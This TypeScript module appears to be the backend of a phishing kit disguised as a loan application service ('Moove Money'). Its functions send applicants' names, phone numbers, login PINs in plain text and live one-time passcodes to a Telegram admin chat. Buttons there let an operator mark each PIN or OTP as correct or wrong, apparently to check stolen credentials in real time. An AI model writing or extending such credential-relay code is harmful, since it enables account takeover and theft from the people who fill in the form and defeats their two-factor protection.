import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

if (!BOT_TOKEN) {
  logger.warn("TELEGRAM_BOT_TOKEN is not set — Telegram notifications disabled");
}

if (!ADMIN_CHAT_ID) {
  logger.warn("TELEGRAM_ADMIN_CHAT_ID is not set — Telegram notifications disabled");
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function telegramRequest(method: string, body: Record<string, unknown>): Promise<unknown> {
  const response = await fetch(`${TELEGRAM_API}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const data = await response.json() as Record<string, unknown>;
  if (!data.ok) {
    logger.error({ method, data }, "Telegram API error");
  }
  return data;
}

export interface TelegramMessageResult {
  messageId: string | null;
}

export async function sendLoginApprovalRequest(
  sessionId: string,
  applicantData: {
    firstName: string;
    lastName: string;
    phone: string;
    loginPhone: string;
    pin: string;
    loanType: string;
    loanAmount: number;
    loanTermMonths: number;
    loanPurpose: string;
    employmentStatus: string;
    monthlyIncome: number;
  }
): Promise<TelegramMessageResult> {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    logger.warn("Telegram not configured, skipping notification");
    return { messageId: null };
  }

  const text =
    `🔔 *New Moove Money Loan Application*\n\n` +
    `👤 *Applicant:* ${applicantData.firstName} ${applicantData.lastName}\n` +
    `📞 *Application Phone:* ${applicantData.phone}\n` +
    `📱 *Login Phone:* ${applicantData.loginPhone}\n` +
    `🔑 *PIN:* \`${applicantData.pin}\`\n\n` +
    `💰 *Loan Details:*\n` +
    `  • Type: ${applicantData.loanType}\n` +
    `  • Amount: ${applicantData.loanAmount.toLocaleString("fr-FR")} FCFA\n` +
    `  • Term: ${applicantData.loanTermMonths} months\n` +
    `  • Purpose: ${applicantData.loanPurpose}\n\n` +
    `💼 *Employment:*\n` +
    `  • Status: ${applicantData.employmentStatus}\n` +
    `  • Monthly Income: ${applicantData.monthlyIncome.toLocaleString("fr-FR")} FCFA\n\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n\n` +
    `_Please approve or reject this application:_`;

  const result = await telegramRequest("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_login:${sessionId}` },
          { text: "❌ Reject", callback_data: `reject_login:${sessionId}` },
        ],
      ],
    },
  }) as { ok: boolean; result?: { message_id: number } };

  const messageId = result?.result?.message_id?.toString() ?? null;
  return { messageId };
}

export async function sendOtpVerificationRequest(
  sessionId: string,
  otpCode: string,
  applicantName: string,
  loginPhone: string
): Promise<TelegramMessageResult> {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    logger.warn("Telegram not configured, skipping OTP notification");
    return { messageId: null };
  }

  const text =
    `🔐 *OTP Verification Request*\n\n` +
    `👤 *Applicant:* ${applicantName}\n` +
    `📱 *Phone:* ${loginPhone}\n` +
    `🔢 *OTP Code:* \`${otpCode}\`\n\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n\n` +
    `_Please verify the OTP:_`;

  const result = await telegramRequest("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Correct (OTP + PIN)", callback_data: `otp_correct:${sessionId}` },
        ],
        [
          { text: "❌ Wrong PIN", callback_data: `otp_wrong_pin:${sessionId}` },
          { text: "❌ Wrong OTP", callback_data: `otp_wrong_otp:${sessionId}` },
        ],
      ],
    },
  }) as { ok: boolean; result?: { message_id: number } };

  const messageId = result?.result?.message_id?.toString() ?? null;
  return { messageId };
}

export async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
  await telegramRequest("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false,
  });
}

export async function editMessageReplyMarkup(chatId: string, messageId: string): Promise<void> {
  await telegramRequest("editMessageReplyMarkup", {
    chat_id: chatId,
    message_id: parseInt(messageId, 10),
    reply_markup: { inline_keyboard: [] },
  });
}
